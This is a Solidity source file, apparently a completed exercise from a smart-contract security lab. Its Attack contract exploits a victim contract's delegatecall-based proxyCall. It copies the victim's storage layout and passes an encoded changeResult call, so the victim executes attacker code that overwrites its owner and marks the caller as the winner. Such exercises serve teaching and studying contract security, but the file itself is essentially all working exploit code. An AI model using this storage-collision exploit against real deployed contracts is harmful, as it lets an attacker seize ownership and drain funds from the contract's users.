// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult(address hacker) external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract

    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here
    function changeResult(address hacker) external {
        // console.log("hacker: ", hacker);
        owner = hacker;
        result[hacker] = true;
        // console.log(result[hacker]);
    }

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        address hacker = msg.sender;
        bytes memory data = abi.encodeWithSignature(
            "changeResult(address)",
            hacker
        );
        ID31eg4t3 d31eg4t3 = ID31eg4t3(victim);
        d31eg4t3.proxyCall(data);
    }
}
